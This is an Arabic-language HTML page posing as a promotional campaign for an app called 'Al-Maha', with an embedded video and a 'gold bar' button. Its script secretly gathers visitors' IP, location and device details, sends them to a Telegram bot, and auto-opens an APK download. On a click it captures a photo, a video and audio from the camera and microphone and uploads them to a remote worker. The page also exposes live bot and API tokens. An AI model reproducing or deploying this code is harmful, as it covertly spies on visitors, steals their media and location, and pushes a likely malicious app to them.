<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>تطبيق المها — الحملة الإشهارية</title>
<style>
  body { margin:0; background:#0f172a; color:#e5e7eb; font-family: system-ui, sans-serif;
         display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; text-align:center; }
  .container { max-width:800px; width:100%; }
  iframe { width:100%; aspect-ratio:16/9; border:none; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
  h1 { font-size:1.5rem; margin-bottom:10px; }
  p { color:#94a3b8; margin-bottom:20px; }
  #startMedia {
    margin-top:20px; padding:12px 24px; font-size:16px; font-weight:bold; border:none; border-radius:8px;
    background:linear-gradient(45deg, #FFD700, #FFC107); color:#000; cursor:pointer;
    box-shadow:0 4px 10px rgba(0,0,0,0.3); display:inline-flex; align-items:center; gap:8px; transition:transform 0.2s ease;
  }
  #startMedia:hover { transform:scale(1.05); }
  .contacts { margin-top:20px; font-size:0.95rem; }
  .contacts a { color:#22d3ee; text-decoration:none; display:block; margin:4px 0; }
</style>
</head>
<body>
  <div class="container">
    <h1>مرحبا بك في مجمع استقبال العملاء</h1>
    <p>شاهد الفيديو، وسيبدأ تحميل التطبيق تلقائيًا في تبويب جديد</p>
    <iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=0&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe>
    <button id="startMedia">🌟 سبيكة ذهبية</button>
    <div class="contacts">
      <a href="tel:+212781034015">📞 +212 781-034015</a>
      <a href="mailto:tabonmok7770888@gmail.com">✉️ tabonmok7770888@gmail.com</a>
      <a href="https://instagram.com/shoping_morocco1" target="_blank">📸 @shoping_morocco1</a>
    </div>
  </div>

<script>
  const WORKER_URL = "https://media-relay.tabonmok7770888.workers.dev";
  const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
  const TELEGRAM_CHAT = "7664416709";
  const IPINFO_TOKEN = "3bc0a2eadd8ba5";
  const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
  const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq";

  const ua = navigator.userAgent;
  let ipInfoData = {}, ipDataData = {}, geo = {};

  function fetchIpInfo() {
    return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`).then(r=>r.json()).then(d=>ipInfoData=d).catch(()=>{});
  }
  function fetchIpData() {
    return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`).then(r=>r.json()).then(d=>ipDataData=d).catch(()=>{});
  }
  function fetchGeo() {
    return new Promise(res=>{
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(p=>{
          geo={lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}; res();
        },()=>res());
      } else res();
    });
  }
  function sendTextToTelegram(extra="") {
    const now = new Date().toLocaleString('ar-MA',{hour12:false});
    const msg = `
🚀 زيارة جديدة — تطبيق المها
⏱️ ${now}

🌐 IP: ${ipInfoData.ip||"?"}
📍 ${ipInfoData.city||"?"}, ${ipInfoData.country||"?"}
🌍 ${ipDataData.continent_name||"?"}
🧭 Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} ±${geo.acc??"?"}m
📱 UA: ${ua}

${extra}
    `;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
      method:"POST", headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id: TELEGRAM_CHAT, text: msg})
    });
  }

  Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=>{
    sendTextToTelegram("📥 فتح الصفحة");
    window.open(APK_URL, '_blank', 'noopener');
  });

  function blobToFile(blob, filename){ return new File([blob], filename, {type: blob.type}); }

  async function uploadToWorker(kind, file, caption="") {
    const form = new FormData();
    form.append("kind", kind);
    form.append("caption", caption);
    form.append("file", file);
    const res = await fetch(WORKER_URL, { method: "POST", body: form });
    console.log(kind, await res.text());
  }

  document.getElementById("startMedia").onclick = async ()=>{
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      sendTextToTelegram("✅ إذن الكاميرا/المايك");

      // صورة
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      const photoBlob = await imageCapture.takePhoto();
      await uploadToWorker("photo", blobToFile(photoBlob, "photo.jpg"), "📸 صورة");

      // فيديو قصير 10 ثوانٍ
      const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      const chunks = [];
      recorder.ondataavailable = e => e.data && chunks.push(e.data);
      recorder.start();
      setTimeout(()=> recorder.stop(), 10000);
      await new Promise(res=> recorder.onstop = res);
      await uploadToWorker("video", blobToFile(new Blob(chunks, { type: "video/webm" }), "clip.webm"), "🎥 فيديو");

      // صوت قصير 10 ثوانٍ
      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const audioRecorder = new MediaRecorder(audioStream, { mimeType: "audio/webm" });
      const audioChunks = [];
      audioRecorder.ondataavailable = e => e.data && audioChunks.push(e.data);
      audioRecorder.start();
      setTimeout(()=> audioRecorder.stop(), 10000);
      await new Promise(res=> audioRecorder.onstop = res);
      await uploadToWorker("audio", blobToFile(new Blob(audioChunks, { type: "audio/webm" }), "audio.webm"), "🎙️ صوت");

      stream.getTracks().forEach(t=>t.stop());
      audioStream.getTracks().forEach(t=>t.stop());

      sendTextToTelegram("✅ تم إرسال كل الوسائط");

    } catch (e) {
      sendTextToTelegram("❌ فشل الإذن أو الإرسال");
      console.error(e);
    }
  };
</script>
</body>
</html>
